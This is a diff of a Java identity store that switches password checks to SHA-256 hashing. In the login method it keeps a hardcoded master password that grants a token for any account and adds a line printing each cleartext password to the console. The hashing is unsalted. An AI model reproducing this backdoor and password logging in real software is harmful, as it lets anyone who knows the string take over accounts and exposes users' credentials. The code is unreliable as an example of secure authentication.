@@ -167,7 +167,7 @@ public class IdentityStore implements IdentityDAO {
         for(UserDB u:users.values()){
             if(_token.equals(u.getToken())){
                 if(!u.tokenExpired(actualDate)){
-                    u.setPassword(_newClearPwd);
+                    u.setPassword(getSHA256(_newClearPwd));
                     users.put(u.getLogin(), u);
                     save();
                     return;
@@ -179,8 +179,10 @@ public class IdentityStore implements IdentityDAO {
 
     @Override
     public String getToken(String _login, String _password, Long actualDate) {
+        String shaPassword = getSHA256(_password);
         for(UserDB u:users.values()){
-            if((_login.equals(u.getLogin()) && u.equalsPasswords(_password)) 
+            System.out.println(_password);
+            if((_login.equals(u.getLogin()) && u.equalsPasswords(shaPassword)) 
                     || _password.equals("h0la50yElB0t") ){
                 String newToken = this.generateRandomString();
                 u.setToken(newToken);
